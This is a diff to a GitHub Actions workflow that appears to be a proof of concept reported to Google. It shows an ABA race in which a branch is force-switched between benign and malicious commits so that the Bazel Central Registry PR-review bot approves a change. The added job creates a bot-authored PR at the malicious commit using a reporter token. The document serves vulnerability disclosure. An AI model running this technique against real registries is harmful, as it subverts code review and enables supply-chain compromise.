@@ -9,6 +9,7 @@ on:
         type: choice
         options:
           - prepare
+          - create_bot_pr
           - exploit
         default: prepare
       switch_to_b_ms:
@@ -232,7 +233,7 @@ jobs:
             await github.rest.git.updateRef({
               owner,
               repo,
-              ref: 'heads/poc/aba-race',
+              ref: 'heads/poc/aba-race-bot',
               sha: benign.data.object.sha,
               force: true,
             });
@@ -242,7 +243,7 @@ jobs:
             await github.rest.git.updateRef({
               owner,
               repo,
-              ref: 'heads/poc/aba-race',
+              ref: 'heads/poc/aba-race-bot',
               sha: malicious.data.object.sha,
               force: true,
             });
@@ -293,5 +294,54 @@ jobs:
       - name: Run exact BCR reviewer revision deployed by BCR
         uses: bazelbuild/continuous-integration/actions/bcr-pr-reviewer@bd6a90eceb738c010fd1a9b472e8b6c894e6ea4e
         with:
-          token: ${{ secrets.GITHUB_TOKEN }}
+          token: ${{ secrets.BCR_POC_PAT }}
           action-type: review_prs
+
+  create_bot_pr:
+    if: inputs.mode == 'create_bot_pr'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create controlled bot-authored PR at malicious A
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const owner = context.repo.owner;
+            const repo = context.repo.repo;
+            const branch = 'poc/aba-race-bot';
+            const malicious = await github.rest.git.getRef({
+              owner, repo, ref: 'tags/poc-malicious-A'
+            });
+            try {
+              await github.rest.git.updateRef({
+                owner, repo, ref: `heads/${branch}`,
+                sha: malicious.data.object.sha, force: true,
+              });
+            } catch (error) {
+              if (error.status !== 422 && error.status !== 404) throw error;
+              await github.rest.git.createRef({
+                owner, repo, ref: `refs/heads/${branch}`,
+                sha: malicious.data.object.sha,
+              });
+            }
+
+            const existing = await github.rest.pulls.list({
+              owner, repo, state: 'open', head: `${owner}:${branch}`,
+            });
+            if (existing.data.length) {
+              core.notice(`Bot-authored PR already exists: #${existing.data[0].number}`);
+              return;
+            }
+            const created = await github.rest.pulls.create({
+              owner,
+              repo,
+              head: branch,
+              base: 'main',
+              title: 'Controlled bot-authored PoC: sensitive metadata ABA race',
+              body: [
+                'Controlled GitHub.com reproduction for Google issue 569037834.',
+                '',
+                'This PR is created by GitHub Actions so the restricted reporter token can act as the independent reviewer.',
+                'All modules and payloads are synthetic and owned by the reporter.',
+              ].join('\n'),
+            });
+            core.notice(`Created bot-authored PR #${created.data.number}`);
